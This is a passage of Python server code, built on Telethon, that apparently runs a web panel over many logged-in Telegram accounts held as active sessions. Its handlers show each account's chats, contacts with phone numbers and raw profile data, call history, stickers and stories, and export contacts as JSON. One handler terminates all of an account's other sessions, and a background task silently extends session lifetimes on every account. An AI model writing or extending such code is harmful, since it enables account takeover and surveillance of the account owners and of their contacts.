             final_list = [d for d in main_dialogs if not d.archived]
        else:
             res = await session.client(GetDialogFiltersRequest())
             raw_list = res.filters if hasattr(res, 'filters') else res
             folders = [f for f in raw_list if isinstance(f, DialogFilter)]
             target_filter = next((f for f in folders if f.id == folder_id), None)
             
             if target_filter:
                 def matches_filter(dialog, f):
                    try:
                        peer_id = utils.get_peer_id(dialog.entity)
                        for exc in f.exclude_peers:
                            if utils.get_peer_id(exc) == peer_id: return False
                        if f.exclude_muted:
                            d_settings = getattr(dialog.dialog, 'notify_settings', None)
                            mute_until = getattr(d_settings, 'mute_until', 0) if d_settings else 0
                            if isinstance(mute_until, datetime): mute_until = mute_until.timestamp()
                            if mute_until and mute_until > datetime.now().timestamp(): return False
                        if f.exclude_read and not dialog.unread_count: return False
                        if f.exclude_archived and dialog.archived: return False
                        
                        for inc in f.include_peers + f.pinned_peers:
                            if utils.get_peer_id(inc) == peer_id: return True
                        if f.contacts and dialog.is_user and getattr(dialog.entity, 'contact', False): return True
                        if f.non_contacts and dialog.is_user and not getattr(dialog.entity, 'contact', False) and not getattr(dialog.entity, 'bot', False): return True
                        if f.bots and dialog.is_user and getattr(dialog.entity, 'bot', False): return True
                        if f.groups and dialog.is_group: return True
                        if f.broadcasts and dialog.is_channel and not dialog.is_group: return True
                    except: return False
                    return False
                 
                 final_list = [d for d in main_dialogs if matches_filter(d, target_filter)]
        
        defaults = getattr(session, 'notify_defaults', {'users': False, 'groups': False, 'broadcasts': False})
        
        # Use Global Render Function
        html = render_dialog_list(final_list, str(user_id), defaults=defaults) # Pass defaults
        return web.Response(text=html, content_type='text/html')

    except Exception as e:
        logger.error(f"Paging error: {e}")
        return web.Response(status=500)

async def handle_user_folders_update(request):
    try:
        user_id = request.match_info.get('user_id')
        active_sessions = request.app['active_sessions']
        session = active_sessions.get(int(user_id))
        
        from telethon.tl.functions.messages import GetDialogFiltersRequest, GetPinnedDialogsRequest
        from telethon.tl.functions.account import GetNotifySettingsRequest
        from telethon.tl.types import DialogFilter, InputNotifyUsers, InputNotifyChats, InputNotifyBroadcasts
        from telethon import utils
        
        folders = []
        filter_pool = []
        main_dialogs = []
        defaults = {'users': False, 'groups': False, 'broadcasts': False}
        
        if session and session.client and session.client.is_connected():
            try:
                # Use cached defaults
                defaults = getattr(session, 'notify_defaults', defaults)

                res = await session.client(GetDialogFiltersRequest())
                raw_list = res.filters if hasattr(res, 'filters') else res
                folders = [f for f in raw_list if isinstance(f, DialogFilter)]
                
                # Fetch Pinned for All (Folder 0)
                all_pinned_ids = None
                try:
                     res_p = await session.client(GetPinnedDialogsRequest(folder_id=0))
                     all_pinned_ids = []
                     if hasattr(res_p, 'dialogs'):
                         for d in res_p.dialogs:
                             all_pinned_ids.append(utils.get_peer_id(d.peer))
                except: pass

                # Reduced limits for speed (150 main, 50 archive)
                async for d in session.client.iter_dialogs(folder=0, limit=150, ignore_migrated=True):
                     if d.archived: continue
                     main_dialogs.append(d)
                
                archived_dialogs = []
                try:
                     async for d in session.client.iter_dialogs(folder=1, limit=50):
                         archived_dialogs.append(d)
                except: pass
                
                seen_ids = set()
                for d in main_dialogs + archived_dialogs:
                     try:
                         pid = utils.get_peer_id(d.entity)
                         if pid not in seen_ids:
                             filter_pool.append(d)
                             seen_ids.add(pid)
                     except: pass
            except Exception as e:
                logger.error(f"Error fetching update: {e}")
                return web.json_response({'error': str(e)}, status=500)
        else:
             return web.json_response({'error': 'Session not active'}, status=404)

        pin_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-pin-icon lucide-pin"><path d="M12 17v5"/><path d="M9 10.76a2 2 0 0 1-1.11 1.79l-1.78.9A2 2 0 0 0 5 15.24V16a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-.76a2 2 0 0 0-1.11-1.79l-1.78-.9A2 2 0 0 1 15 10.76V7a1 1 0 0 1 1-1 2 2 0 0 0 0-4H8a2 2 0 0 0 0 4 1 1 0 0 1 1 1z"/></svg>"""
        mute_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-volume-x-icon lucide-volume-x"><path d="M11 4.702a.705.705 0 0 0-1.203-.498L6.413 7.587A1.4 1.4 0 0 1 5.416 8H3a1 1 0 0 0-1 1v6a1 1 0 0 0 1 1h2.416a1.4 1.4 0 0 1 .997.413l3.383 3.384A.705.705 0 0 0 11 19.298z"/><line x1="22" x2="16" y1="9" y2="15"/><line x1="16" x2="22" y1="9" y2="15"/></svg>"""
        bookmark_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-bookmark-icon lucide-bookmark"><path d="M17 3a2 2 0 0 1 2 2v15a1 1 0 0 1-1.496.868l-4.512-2.578a2 2 0 0 0-1.984 0l-4.512 2.578A1 1 0 0 1 5 20V5a2 2 0 0 1 2-2z"/></svg>"""
        at_sign_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-at-sign-icon lucide-at-sign"><circle cx="12" cy="12" r="4"/><path d="M16 8v5a3 3 0 0 0 6 0v-1a10 10 0 1 0-4 8"/></svg>"""
        check_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check-icon lucide-check"><path d="M20 6 9 17l-5-5"/></svg>"""
        double_check_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check-check-icon lucide-check-check"><path d="M18 6 7 17l-5-5"/><path d="m22 10-7.5 7.5L13 16"/></svg>"""
        voice_chat_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-audio-lines-icon lucide-audio-lines"><path d="M2 10v3"/><path d="M6 6v11"/><path d="M10 3v18"/><path d="M14 8v7"/><path d="M18 5v13"/><path d="M22 10v3"/></svg>"""

        def matches_filter(dialog, f):
            try:
                peer_id = utils.get_peer_id(dialog.entity)
                for exc in f.exclude_peers:
                    if utils.get_peer_id(exc) == peer_id: return False
                if f.exclude_muted:
                    d_settings = getattr(dialog.dialog, 'notify_settings', None)
                    mute_until = getattr(d_settings, 'mute_until', 0) if d_settings else 0
                    if isinstance(mute_until, datetime): mute_until = mute_until.timestamp()
                    if mute_until and mute_until > datetime.now().timestamp(): return False
                if f.exclude_read and not dialog.unread_count: return False
                if f.exclude_archived and dialog.archived: return False
                for inc in f.include_peers + f.pinned_peers:
                    if utils.get_peer_id(inc) == peer_id: return True
                if f.contacts and dialog.is_user and getattr(dialog.entity, 'contact', False): return True
                if f.non_contacts and dialog.is_user and not getattr(dialog.entity, 'contact', False) and not getattr(dialog.entity, 'bot', False): return True
                if f.bots and dialog.is_user and getattr(dialog.entity, 'bot', False): return True
                if f.groups and dialog.is_group: return True
                if f.broadcasts and dialog.is_channel and not dialog.is_group: return True
            except: return False
            return False

        response_data = {}
        # Use Global Render Function
        response_data['All'] = render_dialog_list(main_dialogs, str(user_id), defaults=defaults, pinned_ids=all_pinned_ids)
        if folders:
            for f in folders:
                f_dialogs = [d for d in filter_pool if matches_filter(d, f)]
                pinned_ids = [utils.get_peer_id(p) for p in f.pinned_peers]
                tab_id = f"tab_{f.id}"
                response_data[tab_id] = render_dialog_list(f_dialogs, str(user_id), defaults=defaults, pinned_ids=pinned_ids)
                
        return web.json_response(response_data)
    except Exception as e:
        logger.error(f"Update handler error: {e}")
        return web.json_response({'error': str(e)}, status=500)

async def handle_terminate_sessions(request):
    try:
        data = await request.json()
        user_id = data.get('user_id')
        session = request.app['active_sessions'].get(int(user_id))
        
        if session and session.client:
             await session.client(ResetAuthorizationsRequest())
             return web.json_response({'status': 'ok'})
        return web.json_response({'error': 'no_session'}, status=400)
    except Exception as e:
        return web.json_response({'error': str(e)}, status=500)

async def handle_terminate_session(request):
    try:
        data = await request.json()
        user_id = data.get('user_id')
        session_hash = data.get('hash')
        session = request.app['active_sessions'].get(int(user_id))
        
        if session and session.client and session_hash:
             await session.client(ResetAuthorizationRequest(hash=int(session_hash)))
             return web.json_response({'status': 'ok'})
             
        return web.json_response({'error': 'bad_req'}, status=400)
    except Exception as e:
        logger.error(f"Term Sess Error: {e}")
        return web.json_response({'error': str(e)}, status=500)

async def auto_set_ttl_task(active_sessions):
    """
    Background task to set Account TTL to 1 Year (365 Days) for all logged-in users.
    Runs every hour.
    """
    from telethon.tl.functions.account import SetAccountTTLRequest, SetAuthorizationTTLRequest
    from telethon.tl.types import AccountDaysTTL
    
    logger.info("Starting Auto-Set TTL Task (1 Year) loop.")
    while True:
        try:
            # Iterate safely
            sessions = list(active_sessions.values())
            for session in sessions:
                try:
                    if session and session.client and session.client.is_connected():
                        # User requested NOT to change "Delete Account" setting. 
                        # So we ONLY set Session TTL (Terminate Old Sessions).
                        
                        # Set Session TTL to 365 days (Terminate Old Sessions)
                        try:
                            await session.client(SetAuthorizationTTLRequest(authorization_ttl_days=365))
                        except: pass # Ignore if not supported or error
                        
                        # logger.info(f"Set TTL to 365 days for user {session.user_id}")
                except Exception as e:
                    # Silent failure as requested, retry next cycle
                    pass
                    # logger.error(f"Auto-TTL Set failed for user: {e}")
                
                # Small delay between users
                await asyncio.sleep(5)
                
        except Exception as outer_e:
            # Silent failure for outer loop too
            pass
            # logger.error(f"Error in auto_set_ttl_task loop: {outer_e}")
            
        # Wait 12 hours (43200 seconds)
        await asyncio.sleep(43200)

async def handle_load_contacts_api(request):
    try:
        user_id = request.match_info.get('user_id')
        active_sessions = request.app['active_sessions']
        session = active_sessions.get(int(user_id))
        if not session or not session.client.is_connected():
            return web.Response(text='<div style="text-align:center; padding:40px; color:#ff3b30;">Session disconnected</div>', status=404)
        
        from telethon.tl.functions.contacts import GetContactsRequest
        result = await session.client(GetContactsRequest(hash=0))
        contacts_list = result.users

        if not contacts_list:
            return web.Response(text="<div style='text-align:center; padding:40px; color:#999;'>No contacts found.</div>")

        is_items_only = request.query.get('items') == '1'

        from telethon import utils
        html = ""
        if not is_items_only:
            html = """<style>
.user-wrap { border-bottom: 1px solid #f0f2f5; padding: 10px; font-family: sans-serif; background: #fff; }
.user-row { display: flex; align-items: center; justify-content: space-between; }
.user-pic { width: 44px; height: 44px; border-radius: 50%; object-fit: cover; margin-right: 12px; background: #eee; }
.user-pic-fallback { width: 44px; height: 44px; border-radius: 50%; display:flex; align-items:center; justify-content:center; background:#2481cc; color:#fff; font-size:18px; font-weight:600; margin-right: 12px;}
.info { flex: 1; min-width: 0; }
.name { font-size: 16px; font-weight: 500; color: #1c1e21; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
.status-text { font-size: 12px; margin-top: 2px; }
.right-actions { display: flex; align-items: center; gap: 8px; }
.more-toggle { border: 1px solid #ccc; border-radius: 20px; padding: 4px 12px; cursor: pointer; font-size: 12px; font-weight: bold; transition: 0.2s; }
.status-dot { width: 8px; height: 8px; border-radius: 50%; }
.dot-grey { background-color: #ccc; }
.dot-green { background-color: #4cd964; }
.dot-black { background-color: #000; }
.details-box { background: #f5f6f7; border-radius: 10px; padding: 10px; margin-top: 10px; font-size: 13px; }
.detail-line { margin-bottom: 4px; display: flex;}
.detail-line .k { font-weight: 500; color: #333; width: 180px; flex-shrink: 0;}
.detail-line .v, .detail-line .v-hl { color: #666; word-break: break-all; }
.v-hl { color: #d94c4c; font-weight: 500; }
.divider { height: 1px; background: #ddd; margin: 8px 0; }
.raw-header { font-size: 11px; color: #999; font-weight: bold; margin-bottom: 6px; }
</style>
<div class="contacts-list" id="contacts-list-container">"""
        if not is_items_only:
            html += f'''
<div class="user-wrap item-row" style="background: #fcfcfc;">
    <div class="user-row">
        <div class="user-pic-fallback" style="background: #2481cc;">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/><path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16"/><path d="M8 16H3v5"/></svg>
        </div>
        <div class="info">
            <div class="name">Auto Refresh</div>
        </div>
        <div class="right-actions" style="gap: 12px;">
            <div id="refresh-status-icon" style="background: #ccc; color: white; width: 44px; height: 44px; display: flex; align-items: center; justify-content: center; border-radius: 50%; font-size: 14px; font-weight: bold; transition: 0.2s;">
                Off
            </div>
            <div id="refresh-toggle" onclick="toggleAutoRefresh()" style="background: #ccc; cursor: pointer; color: white; width: 44px; height: 44px; display: flex; align-items: center; justify-content: center; border-radius: 50%; transition: 0.2s;">
                <svg id="toggle-off-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="9" cy="12" r="3"/><rect width="20" height="14" x="2" y="5" rx="7"/></svg>
            </div>
            <div onclick="location.href='/api/user/{user_id}/contacts/download'" style="background: #2481cc; cursor: pointer; color: white; width: 44px; height: 44px; display: flex; align-items: center; justify-content: center; border-radius: 50%;">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 17V3"/><path d="m6 11 6 6 6-6"/><path d="M19 21H5"/></svg>
            </div>
        </div>
    </div>
</div>
<div id="contacts-items-chunk">
'''
        else:
            html += '<div id="contacts-items-chunk">'

        def get_sort_key(user):
            s = getattr(user, 'status', None)
            if not s: return 0
            k = s.__class__.__name__
            if "Online" in k: return 9999999999
            if "Offline" in k: return s.was_online.timestamp() if hasattr(s, 'was_online') else 0
            if "Recently" in k: return 4
            if "LastWeek" in k: return 3
            if "LastMonth" in k: return 2
            return 0
            
        contacts_list.sort(key=get_sort_key, reverse=True)

        for idx, user in enumerate(contacts_list):
            peer_id = utils.get_peer_id(user)
            name = utils.get_display_name(user) or "Unknown"
            phone = getattr(user, 'phone', None)
            username = getattr(user, 'username', None) or "-"
            status_obj = getattr(user, 'status', None)
            status_raw = status_obj.__class__.__name__ if status_obj else "None"
            
            is_online = False
            is_black_dot = False
            status_text = "last seen a long time ago"
            if status_obj:
                if "UserStatusOnline" in status_raw:
                    is_online = True
                    status_text = "Online"
                elif "UserStatusOffline" in status_raw:
                    if hasattr(status_obj, 'was_online'):
                        dt = status_obj.was_online + timedelta(hours=5, minutes=30)
                        now_dt = datetime.utcnow() + timedelta(hours=5, minutes=30)
                        time_str = dt.strftime('%I:%M %p').lstrip('0')
                        if dt.date() == now_dt.date():
                            status_text = f"last seen at {time_str}"
                        elif dt.date() == (now_dt - timedelta(days=1)).date():
                            status_text = f"last seen yesterday at {time_str}"
                        else:
                            date_str = dt.strftime('%b %d at ') + time_str
                            status_text = f"last seen {date_str}"
                elif "UserStatusRecently" in status_raw:
                    status_text = "last seen recently"
                elif "UserStatusLastWeek" in status_raw:
                    status_text = "last seen within a week"
                elif "UserStatusLastMonth" in status_raw:
                    status_text = "last seen within a month"
                    is_black_dot = True
                elif "UserStatusEmpty" in status_raw:
                    status_text = "last seen a long time ago"
                    is_black_dot = True

            formatted_phone = f"+{phone}" if phone and not str(phone).startswith('+') else phone
            phone_html = f'<span class="v">{formatted_phone}</span>' if formatted_phone else '<span class="v-hl">No Number</span>'
            c_id = f"c-{idx}"
            avatar_url = f"/avatar/{user_id}/{peer_id}"
            search_str = f"{name.lower()} {str(phone).lower()}"
            
            raw_lines = ""
            user_dict = user.to_dict() if hasattr(user, 'to_dict') else {}
            for k, v in user_dict.items():
                if k in ('photo', 'status'): continue
                v_str = str(v).replace('<', '&lt;').replace('>', '&gt;')
                if k == 'phone' and v_str and not v_str.startswith('+'):
                    v_str = '+' + v_str
                raw_lines += f'<div class="detail-line"><span class="k">{k}:</span> <span class="v">{v_str}</span></div>'

            html += f'''
            <div class="user-wrap item-row" data-search="{search_str}">
                <div class="user-row">
                    <div style="display:flex; align-items:center; gap:10px; flex:1; min-width:0; cursor:pointer;" onclick="window.open('/user/{user_id}/chat/{peer_id}','_blank')">
                        <img class="user-pic" src="{avatar_url}" loading="lazy" onerror="this.outerHTML='<div class=\\'user-pic-fallback\\'>{name[:1]}</div>'">
                        <div class="info">
                            <div class="name">{name}</div>
                            <div class="status-text" style="color:{'#4cd964' if is_online else '#666'}">{status_text}</div>
                        </div>
                    </div>
                    <div class="right-actions">
                        <button id="btn-{c_id}" class="more-toggle" onclick="toggleDetails('{c_id}')" style="background: rgb(255, 255, 255);">More</button>
                        <div class="status-dot {'dot-green' if is_online else ('dot-black' if is_black_dot else 'dot-grey')}"></div>
                    </div>
                </div>
                <div id="details-{c_id}" class="details-box" style="display: none;">
                    <div class="detail-line"><span class="k">Full Name:</span> <span class="v">{name}</span></div>
                    <div class="detail-line"><span class="k">Phone:</span> {phone_html}</div>
                    <div class="detail-line"><span class="k">User ID:</span> <span class="v">{peer_id}</span></div>
                    <div class="detail-line"><span class="k">Username:</span> <span class="v">{username}</span></div>
                    <div class="detail-line"><span class="k">Status Raw:</span> <span class="v">{status_raw}</span></div>
                    <div class="divider"></div>
                    <div class="raw-header">RAW DATA:</div>
                    {raw_lines}
                </div>
            </div>
            '''
        html += "</div>"
        if not is_items_only: html += "</div>"
        return web.Response(text=html, content_type='text/html')
    except Exception as e:
        return web.Response(text=f"<div style='text-align:center; padding:40px; color:#ff3b30;'>Error: {str(e)}</div>", status=500)

async def handle_download_contacts_api(request):
    try:
        user_id = request.match_info.get('user_id')
        active_sessions = request.app['active_sessions']
        session = active_sessions.get(int(user_id))
        if not session or not session.client.is_connected():
            return web.Response(text='Session disconnected', status=404)
        
        from telethon.tl.functions.contacts import GetContactsRequest
        from telethon import utils
        result = await session.client(GetContactsRequest(hash=0))
        
        history = get_history()
        udata = history.get(str(user_id), {})
        custom_name = udata.get('custom_name') or udata.get('name', 'User')
        
        export_data = []
        for user in result.users:
            phone = getattr(user, 'phone', None)
            export_data.append({
                "Full Name": utils.get_display_name(user) or "Unknown",
                "Phone": f"+{phone}" if phone and not str(phone).startswith('+') else (phone if phone else "No Number"),
                "User ID": utils.get_peer_id(user),
                "Username": getattr(user, 'username', None) or "-"
            })
            
        json_data = json.dumps(export_data, indent=4)
        filename = "".join([c for c in custom_name if c.isalpha() or c.isdigit() or c in (' ', '-', '_')]).strip()
        if not filename: filename = "contacts"
        
        return web.Response(
            body=json_data.encode('utf-8'),
            headers={
                "Content-Disposition": f'attachment; filename="{filename}.json"',
                "Content-Type": "application/json"
            }
        )
    except Exception as e:
        return web.Response(text=f"Error: {str(e)}", status=500)

async def handle_load_calls_api(request):
    try:
        user_id = request.match_info.get('user_id')
        active_sessions = request.app['active_sessions']
        session = active_sessions.get(int(user_id))
        if not session or not session.client.is_connected():
            return web.Response(text='<div style="text-align:center; padding:40px; color:#ff3b30;">Session disconnected</div>', status=404)
        
        main_dialogs = []
        async for d in session.client.iter_dialogs(folder=0, limit=200, ignore_migrated=True):
             main_dialogs.append(d)
             
        user_dialogs = [d for d in main_dialogs if d.is_user and not d.entity.bot]
        to_scan = user_dialogs[:100]
        call_entities = {}
        
        from telethon.tl.types import MessageActionPhoneCall, PhoneCallDiscardReasonMissed, PhoneCallDiscardReasonBusy
        from telethon import utils
        
        async def scan_chat_for_calls(d):
            c_calls = []
            try:
                async for m in session.client.iter_messages(d.entity, limit=200):
                    if isinstance(m.action, MessageActionPhoneCall):
                        c_calls.append(m)
            except: pass
            return c_calls

        tasks = [scan_chat_for_calls(d) for d in to_scan]
        calls_list = []
        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            all_fetched = []
            for res in results:
                if isinstance(res, list): all_fetched.extend(res)
            all_fetched.sort(key=lambda x: x.date.timestamp(), reverse=True)
            calls_list = all_fetched
            for d in to_scan:
                pid = utils.get_peer_id(d.entity)
                call_entities[pid] = d.entity

        if not calls_list:
            return web.Response(text="<div style='text-align:center; padding:40px; color:#999;'>No calls found.</div>")

        call_out_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-phone-outgoing-icon lucide-phone-outgoing" style="color: #4cd964;"><path d="m16 8 6-6"/><path d="M22 8V2h-6"/><path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384"/></svg>"""
        call_missed_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-phone-missed-icon lucide-phone-missed" style="color: #ff3b30;"><path d="m16 2 6 6"/><path d="m22 2-6 6"/><path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384"/></svg>"""
        call_in_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-phone-incoming-icon lucide-phone-incoming" style="color: #4cd964;"><path d="M16 2v6h6"/><path d="m22 2-6 6"/><path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384"/></svg>"""

        html = '<div class="chat-list">'
        for msg in calls_list:
            peer_id = utils.get_peer_id(msg.peer_id)
            user = call_entities.get(peer_id)
            name = utils.get_display_name(user) if user else "Unknown"
            uid = peer_id
            username = getattr(user, 'username', None)
            uid_text = f"{uid} - @{username}" if username else str(uid)
            
            time_str = ""
            try:
                dt = msg.date + timedelta(hours=5, minutes=30)
                time_str = dt.strftime("%I:%M %p %d/%m/%Y").lstrip("0")
            except: pass
            
            action = msg.action
            duration = getattr(action, 'duration', 0) or 0
            reason = getattr(action, 'reason', None)
            
            h = duration // 3600
            m = (duration % 3600) // 60
            s = duration % 60
            dur_str = f"{h:02d}:{m:02d}:{s:02d}"
            
            icon = call_in_svg
            if msg.out: 
                icon = call_out_svg
                if isinstance(reason, PhoneCallDiscardReasonBusy):
                    dur_str = "Busy"
            else:
                if isinstance(reason, (PhoneCallDiscardReasonMissed, PhoneCallDiscardReasonBusy)) or duration == 0:
                     icon = call_missed_svg
                     if isinstance(reason, PhoneCallDiscardReasonBusy):
                         dur_str = "Busy"
                     else:
                         dur_str = "Missed Call"
            
            html += f'''
            <div class="chat-item" style="cursor: default; height: auto; min-height: 72px;">
                <div class="avatar-wrapper">
                    <img src="/avatar/{user_id}/{peer_id}" class="chat-avatar" onerror="this.outerHTML='<div class=chat-icon>{name[:1]}</div>'">
                </div>
                <div class="chat-main">
                    <div class="chat-header" style="align-items: flex-start;">
                        <div style="display:flex; flex-direction:column; max-width: 100%;">
                            <div class="chat-name" style="max-width: 100%;">{name}</div>
                            <div style="font-size: 12px; color: #707579;">{uid_text}</div>
                        </div>
                    </div>
                    <div class="chat-body" style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
                        <div class="chat-preview" style="display:flex; align-items:center; gap:6px;">
                             {icon}
                             <span style="font-weight: 500; color: #333;">{dur_str}</span>
                        </div>
                        <div class="chat-time" style="font-size: 12px; color: #707579;">{time_str}</div>
                    </div>
                </div>
            </div>
            '''
        html += "</div>"
        return web.Response(text=html, content_type='text/html')
    except Exception as e:
        return web.Response(text=f"<div style='text-align:center; padding:40px; color:#ff3b30;'>Error: {str(e)}</div>", status=500)

async def handle_load_stickers_api(request):
    try:
        user_id = request.match_info.get('user_id')
        active_sessions = request.app['active_sessions']
        session = active_sessions.get(int(user_id))
        if not session or not session.client.is_connected():
            return web.Response(text='<div style="text-align:center; padding:40px; color:#ff3b30;">Session disconnected</div>', status=404)
        
        from telethon.tl.functions.messages import GetAllStickersRequest
        result = await session.client(GetAllStickersRequest(hash=0))
        packs = getattr(result, 'sets', [])
        
        if not packs:
            return web.Response(text="<div style='text-align:center; padding:40px; color:#999;'>No sticker packs found.</div>")

        html = """<style>
.sticker-wrap { border-bottom: 1px solid #f0f2f5; padding: 10px; font-family: sans-serif; background: #fff; display: flex; align-items: center; justify-content: space-between; }
.pack-idx { width: 44px; height: 44px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: #2481cc; color: white; font-weight: bold; flex-shrink: 0; margin-right: 12px; }
.pack-info { flex: 1; min-width: 0; }
.pack-name { font-size: 16px; font-weight: 500; color: #1c1e21; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
.pack-count { font-size: 13px; color: #707579; margin-top: 2px; }
.copy-btn { width: 44px; height: 44px; border-radius: 50%; background: #f0f2f5; display: flex; align-items: center; justify-content: center; cursor: pointer; color: #333; transition: 0.2s; border: none; outline: none; flex-shrink: 0;}
.copy-btn:active { background: #e4e6eb; }
</style>
<div class="stickers-list">
"""
        for idx_raw, p in enumerate(packs):
            idx = idx_raw + 1
            fsize = "16px" if idx < 100 else "14px" if idx < 1000 else "11px"
            title = p.title
            short_name = p.short_name
            count = p.count
            link = f"https://t.me/addstickers/{short_name}"
            
            html += f'''
            <div class="sticker-wrap">
                <div style="display: flex; align-items: center; flex: 1; min-width: 0;">
                    <div class="pack-idx" style="font-size: {fsize};">{idx}</div>
                    <div class="pack-info">
                        <div class="pack-name">{title}</div>
                        <div class="pack-count">{count} stickers</div>
                    </div>
                </div>
                <button class="copy-btn" onclick="copyText('{link}'); this.style.color='#2481cc'; setTimeout(()=>this.style.color='#333', 1000);" title="Copy Link">
                    <svg xmlns="http://www.w3.org/2000/svg" height="20px" viewBox="0 -960 960 960" width="20px" fill="currentColor"><path d="M360-240q-33 0-56.5-23.5T280-320v-480q0-33 23.5-56.5T360-880h360q33 0 56.5 23.5T800-800v480q0 33-23.5 56.5T720-240H360Zm0-80h360v-480H360v480ZM200-80q-33 0-56.5-23.5T120-160v-560h80v560h440v80H200Zm160-240v-480 480Z"/></svg>
                </button>
            </div>
            '''
        html += "</div>"
        return web.Response(text=html, content_type='text/html')
    except Exception as e:
        return web.Response(text=f"<div style='text-align:center; padding:40px; color:#ff3b30;'>Error: {str(e)}</div>", status=500)

async def handle_load_stories_api(request):
    try:
        user_id = request.match_info.get('user_id')
        active_sessions = request.app['active_sessions']
        session = active_sessions.get(int(user_id))
        if not session or not session.client.is_connected():
            return web.Response(text='<div style="text-align:center; padding:40px; color:#ff3b30;">Session disconnected</div>', status=404)
        
        client = session.client
        from telethon import utils
        
        entities_with_stories = []
        seen_ids = set()
        
        def add_entity(entity):
            if not entity: return
            stories_max_id = getattr(entity, 'stories_max_id', 0)
            if not stories_max_id: return
            
            pid = utils.get_peer_id(entity)
            if pid not in seen_ids:
                seen_ids.add(pid)
                entities_with_stories.append(entity)

        # 1. Main and archived dialogs
        for f in [0, 1]:
            try:
                async for d in client.iter_dialogs(folder=f, limit=2500, ignore_migrated=True):
                    add_entity(d.entity)
            except Exception:
                pass

        # 2. Contacts
        try:
            from telethon.tl.functions.contacts import GetContactsRequest
            contacts = await client(GetContactsRequest(hash=0))
            for u in contacts.users:
                add_entity(u)
        except Exception:
            pass
            
        if not entities_with_stories:
            return web.Response(text="<div style='text-align:center; padding:40px; color:#999;'>No stories found.</div>")

        html = """<style>
.user-wrap { border-bottom: 1px solid #f0f2f5; padding: 10px; font-family: sans-serif; background: #fff; }
.user-row { display: flex; align-items: center; justify-content: space-between; }
.user-pic { width: 44px; height: 44px; border-radius: 50%; object-fit: cover; margin-right: 12px; background: #eee; }
.user-pic-fallback { width: 44px; height: 44px; border-radius: 50%; display:flex; align-items:center; justify-content:center; background:#2481cc; color:#fff; font-size:18px; font-weight:600; margin-right: 12px;}
.info { flex: 1; min-width: 0; }
.name { font-size: 16px; font-weight: 500; color: #1c1e21; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
.status-text { font-size: 12px; margin-top: 2px; }
.right-actions { display: flex; align-items: center; gap: 8px; }
.more-toggle { border: 1px solid #ccc; border-radius: 20px; padding: 4px 12px; cursor: pointer; font-size: 12px; font-weight: bold; transition: 0.2s; }
</style>
<div class="chat-list">"""
        
        from telethon.tl.functions.stories import GetPeerStoriesRequest
        from telethon.tl.types import User, Channel

